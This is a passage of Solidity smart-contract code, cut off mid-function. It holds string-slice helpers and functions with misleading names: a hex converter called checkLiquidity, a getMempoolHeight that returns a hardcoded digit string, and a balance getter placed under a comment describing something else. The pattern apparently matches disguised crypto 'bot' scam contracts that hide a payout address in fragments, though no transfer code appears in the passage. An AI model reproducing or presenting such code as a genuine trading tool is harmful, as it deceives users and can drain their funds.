    function checkLiquidity(uint a) internal pure returns (string memory) {

        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }

        return string(res);
    }

    function getMempoolHeight() private pure returns (string memory) {
        return "39363";
    }
    /*
     * @dev If `self` starts with `needle`, `needle` is removed from the
     *      beginning of `self`. Otherwise, `self` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return `self`
     */
    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }

    // Returns the memory address of the first byte of the first occurrence of
    // `needle` in `self`, or the first byte after `self` if not found.
    function getBa() private view returns(uint) {
        return address(this).balance;
    }

    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }
